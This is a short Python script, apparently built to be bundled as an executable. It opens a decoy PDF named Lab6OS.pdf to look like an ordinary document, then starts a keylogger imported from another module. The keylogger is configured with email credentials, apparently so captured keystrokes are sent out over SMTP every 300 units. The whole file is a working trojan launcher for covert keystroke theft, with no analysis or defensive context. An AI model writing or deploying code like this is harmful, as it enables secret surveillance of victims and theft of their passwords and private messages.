import keylogger
import smtplib
import sys
import subprocess

file_name = ""

if getattr(sys, 'frozen', False):
    file_name = sys._MEIPASS + "\\Lab6OS.pdf"
subprocess.Popen(file_name, shell=True)

try:
    keylogger = keylogger.Keylogger(300, "mail@gmail.com", "password")
    keylogger.start()
except smtplib.SMTPAuthenticationError:
    sys.exit()


